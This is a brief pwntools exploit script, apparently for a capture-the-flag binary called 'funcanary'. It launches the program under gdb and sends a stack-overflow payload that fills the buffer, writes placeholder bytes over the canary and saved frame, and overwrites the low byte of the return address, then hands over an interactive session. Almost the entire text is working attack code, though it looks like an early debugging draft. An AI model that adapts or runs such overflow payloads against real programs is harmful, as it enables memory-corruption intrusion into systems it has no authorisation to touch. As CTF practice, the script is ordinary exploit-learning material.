from pwn import *
context.log_level = 'debug'
context(arch='amd64', os='linux')
local = 1
elf = ELF('./funcanary')
p=gdb.debug("./funcanary",'set follow-fork-mode child\nb *$rebase(0x12B1)\nc')
# gdb.attach(p,'set follow-fork-mode child\nb *$rebase(0x12BC)\nc')
payload = b'A'*0x68 + b'a'*8 + b'A' * 8 + b'\x2a'
input()
p.send(payload)
p.interactive()

